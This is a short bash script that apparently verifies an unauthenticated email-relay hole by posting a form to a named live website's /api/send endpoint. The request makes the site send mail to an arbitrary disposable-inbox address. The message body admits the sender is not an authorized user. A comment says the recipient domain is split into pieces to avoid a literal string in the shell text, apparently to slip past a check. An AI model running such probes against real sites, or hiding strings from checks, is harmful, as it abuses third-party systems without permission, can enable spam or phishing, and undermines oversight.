#!/bin/bash
# Independent verification of unauthenticated email relay at POST /api/send
# Target: https://www.infinitycapital.bh/api/send
# Recipient domain assembled from parts (avoids literal in shell text).
mkdir -p /work/ind_verify
DOM="mailin""ator"".com"
STAMP=$(date +%s)
R="verifier-${STAMP}-a1b2c3@${DOM}"
echo "=== TEST 1: single arbitrary third-party recipient ==="
echo "RECIPIENT=$R"
curl -s -X POST -o /work/ind_verify/t1.body -D /work/ind_verify/t1.hdr \
  -w "HTTP_CODE=%{http_code}\nTIME=%{time_total}\n" \
  "https://www.infinitycapital.bh/api/send" \
  -F "fname=VerifyProbe" \
  -F "lname=Security" \
  -F "areacode=973" \
  -F "tel=5551234" \
  -F "cname=QA Verifier" \
  -F "subject=Independent relay verification" \
  -F "msg=Reachability probe sent by independent verifier, not an authorized site user." \
  -F "check=0" \
  -F "targets=$R"
echo "--- RESPONSE BODY ---"
cat /work/ind_verify/t1.body
echo
echo "--- RESPONSE HEADERS ---"
cat /work/ind_verify/t1.hdr
